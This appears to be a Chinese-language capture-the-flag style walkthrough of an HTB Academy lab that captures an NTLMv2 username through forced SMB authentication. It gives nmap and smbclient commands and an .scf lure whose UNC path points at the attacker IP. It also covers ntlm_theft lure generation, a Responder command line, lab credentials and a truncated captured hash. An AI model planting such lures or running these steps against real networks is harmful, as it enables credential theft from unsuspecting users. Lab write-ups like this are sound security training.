# Writeup：LLMNR/NBT-NS Poisoning — 強制 NTLM 驗證擷取 NTLMv2-SSP Username

**Module 情境**：HTB Academy Active Directory LLMNR/NBT-NS Poisoning and SMB Relay（授權教學 lab，個人帳號練習）
**目標主機**：ACADEMY-NTLMR01-LINUX01（10.129.205.223），雙網卡，`ens192` 接到內部 AD 網段 172.16.117.0/24（攻擊機 IP：172.16.117.30）
**最終答案**：NTLMv2-SSP Username（去掉 domain）= **`cmatos`**（完整為 `INLANEFREIGHT\cmatos`，來自 172.16.117.50）

---

## 1. 建立連線並確認雙網卡環境

因為本地沒有 `sshpass`、`expect`，也沒有 sudo 免密碼，先用 `pip install --user pexpect` 寫一個 Python 腳本自動應答 SSH 密碼提示，之後所有遠端指令都透過它執行。

```bash
ssh -o StrictHostKeyChecking=no htb-student@10.129.205.223
# → password: HTB_@cademy_stdnt!
whoami; hostname; ip -4 a; ip route
```

輸出重點：

```
ens160: 10.129.205.223/16   ← HTB 對外管理網段
ens192: 172.16.117.30/24    ← 內部 AD 網段（攻擊機在這張卡上）
```

**解讀**：跳板機有兩張卡，`ens192` 才是跟 AD 內網（含受害機 172.16.117.50）同一個廣播域/子網，Responder 必須綁在這張卡上才能收到 LLMNR/NBT-NS 廣播與後續的 SMB 連線。

---

## 2. 掃描內網找出有 SMB 的主機

```bash
nmap -p445 --open -sV 172.16.117.0/24 -oG - 2>/dev/null | grep -i open
```

結果：

```
172.16.117.3  (dc01)   445/open
172.16.117.50 (ws01)   445/open   ← 題目要求驗證請求要打到這台
172.16.117.60 (sql01)  445/open
```

**解讀**：`-oG -` 用 grepable 格式輸出方便直接篩選，`--open` 只顯示開放的port 省去雜訊。

---

## 3. 列舉每台主機的 SMB share（匿名 `-N`）

```bash
for h in 172.16.117.3 172.16.117.50 172.16.117.60; do
  echo ===$h===
  smbclient -L //$h -N
done
```

在 **dc01 (172.16.117.3)** 看到一個名字正好叫 `smb` 的 share（題目指定名稱），其餘是標準 ADMIN$/C$/NETLOGON/SYSVOL。`-N` 代表 null session（匿名、不帶密碼），能列出來已經表示這台不擋匿名 enum。

---

## 4. 驗證該 share 的 READ / WRITE 權限

```bash
# 讀測試
smbclient //172.16.117.3/smb -N -c 'ls'

# 寫測試
echo lure > /tmp/README.txt
smbclient //172.16.117.3/smb -N -c 'put /tmp/README.txt README.txt; ls'
```

兩者都成功（`put` 回報傳輸速度且 `ls` 看得到新檔案），確認 `//172.16.117.3/smb` 對匿名使用者是 **READ+WRITE**。測完立刻 `del README.txt` 清掉測試檔，避免污染。

---

## 5. 製作「強制驗證」誘餌檔案

### 5.1 第一次嘗試：`.scf`（失敗，知識點記錄）

傳統手法是放一個 `@xxx.scf`，內容指向攻擊機的 UNC path，當有人用 Explorer 瀏覽資料夾、嘗試載入圖示時就會對該 UNC 發起 SMB 驗證：

```
[Shell]
Command=2
IconFile=\\172.16.117.30\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

上傳後等了快 20 分鐘，Responder log 完全沒有來自 172.16.117.50 的 SMB 驗證，只有背景的 LLMNR/NBT-NS/MDNS 雜訊（其他主機打錯名字查詢失敗的噪音）。

**除錯過程**：先確認 Responder 本身沒問題 —

```bash
ss -tlnp | grep -E ':445|:139'
```

確認 445/139 已經 bind 在 `ens192`，排除監聽端的問題。回頭查 `~/tools/ntlm_theft` 這套工具自帶的文件，裡面明寫：

```
.scf – via ICONFILE field (Not Working on Latest Windows)
```

**結論**：`.scf` 的資料夾圖示自動載入在新版 Windows 已經被拿掉，這題的受害機版本夠新，所以此法失效。這是本次除錯最關鍵的一步——不是環境設錯，是攻擊手法本身過時。

### 5.2 改用 `ntlm_theft` 生成現代仍有效的誘餈

```bash
cd ~/tools/ntlm_theft
python3 ntlm_theft.py -g all -s 172.16.117.30 -f Lure
```

`-s` 指定攻擊機 IP，`-g all` 產生全部 21 種類型。挑「Browse to Folder Containing」這一類（只要資料夾被列出/瀏覽就觸發，不需要使用者真的打開檔案）：

```
Lure.lnk            — 透過 icon_location 欄位
Lure-(url).url      — 透過 URL 欄位
Lure-(icon).url     — 透過 ICONFILE 欄位
desktop.ini         — 透過 IconResource 欄位
```

上傳到同一個 share：

```bash
smbclient //172.16.117.3/smb -N -c \
  'put Lure.lnk; put Lure-(url).url; put Lure-(icon).url; put desktop.ini; ls'
```

---

## 6. 在內網介面上以 Analyze 模式啟動 Responder

`-A`（Analyze mode）代表**不主動下毒**，只被動記錄收到的查詢與驗證請求——符合題目要求「用 Analyze 模式」而不是真的去 poison LLMNR 回應。

因為要 sudo 且要背景跑、同時經過非互動的 SSH session 很容易卡在 buffering，踩了兩個坑：

1. **sudo -S 讀不到密碼**：一開始把整條指令的 stdin 導到 `/dev/null`（想避免掛住終端），結果 `sudo -S` 本身要從 stdin 讀密碼，讀到 EOF 直接失敗（`sudo: no password was provided`）。修正：改成 `echo 'PASS' | sudo -S ...`，用管道把密碼餵給 sudo。
2. **log 檔案一直是空的**：Python 預設在非 tty 環境下是 full-buffering，Responder 跑著但 log 看起來空白。修正：加 `stdbuf -oL -eL` + `python3 -u` 強制 line-buffered / unbuffered，輸出才會即時落地。

最終指令：

```bash
cd ~/tools/Responder
echo 'HTB_@cademy_stdnt!' | sudo -S nohup stdbuf -oL -eL python3 -u Responder.py \
  -I ens192 -A > /tmp/resp.log 2>&1 &
disown
```

啟動後確認關鍵設定：

```
Responder IP      [172.16.117.30]
Analyze Mode      [ON]
SMB server        [ON]
```

`disown` 確保 SSH session 斷開後這個背景行程不會被 SIGHUP 殺掉。

---

## 7. 等待並擷取 NTLMv2-SSP

每隔數分鐘用

```bash
grep -i 'NTLMv2\|SMB\]' /tmp/resp.log | grep -vi 'server\|ON\]'
```

檢查。換成 `.lnk`/`.url` 誘餈後不久，log 出現：

```
[SMB] NTLMv2-SSP Client   : 172.16.117.50
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\cmatos
[SMB] NTLMv2-SSP Hash     : cmatos::INLANEFREIGHT:baa44abad65785a9:...
```

`172.16.117.50` 就是題目指定的受害機，Client 欄位對得上；Username 欄位格式是 `DOMAIN\user`。

---

## 8. 答案與收尾

- **去掉 domain 的 NTLMv2-SSP Username = `cmatos`**
- 擷取後立即 `sudo pkill -f Responder.py` 停掉背景行程，避免繼續佔用內網介面 / 殘留在考場環境。
- 共享上的誘餈檔案留在原地（lab 環境，不影響其他練習），`@secret.scf`（已失效）跟新的 `.lnk/.url/desktop.ini` 都還在 `//172.16.117.3/smb`。

---

## 關鍵學習點

| 坑 | 原因 | 修法 |
|---|---|---|
| `.scf` 誘餈完全沒反應 | 現代 Windows 已停用資料夾圖示自動從 UNC 載入 | 換用 `.lnk`/`.url`（ntlm_theft 的 "Browse to Folder" 類別仍有效）|
| `sudo -S` 報 no password provided | 整條背景指令 stdin 被導到 `/dev/null`，sudo 讀不到密碼 | 用 `echo PASS \| sudo -S ...` 管道餵密碼 |
| Responder log 檔案長時間空白 | Python 非 tty 環境下走 full buffering | `stdbuf -oL -eL` + `python3 -u` 強制即時 flush |
| 背景行程怕被 SSH 斷線殺掉 | nohup 不夠，job 仍被 shell 持有 | 額外 `disown` |
